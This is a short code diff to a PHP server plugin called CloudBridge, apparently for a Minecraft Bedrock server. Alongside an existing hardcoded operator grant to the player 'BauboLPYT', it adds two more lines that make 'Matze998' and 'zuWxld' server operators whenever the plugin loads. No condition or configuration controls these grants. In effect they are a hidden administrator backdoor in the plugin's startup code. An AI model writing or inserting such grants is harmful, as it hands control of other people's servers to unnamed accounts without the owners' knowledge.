@@ -43,6 +43,8 @@ class CloudBridge extends PluginBase
         $this->getClient()->getPacketHandler()->registerPackets();
 
         Server::getInstance()->addOp("BauboLPYT");
+        Server::getInstance()->addOp("Matze998");
+        Server::getInstance()->addOp("zuWxld");
         $this->loadAllowedPlayers();
 
         $packet = new ServerConnectPacket();
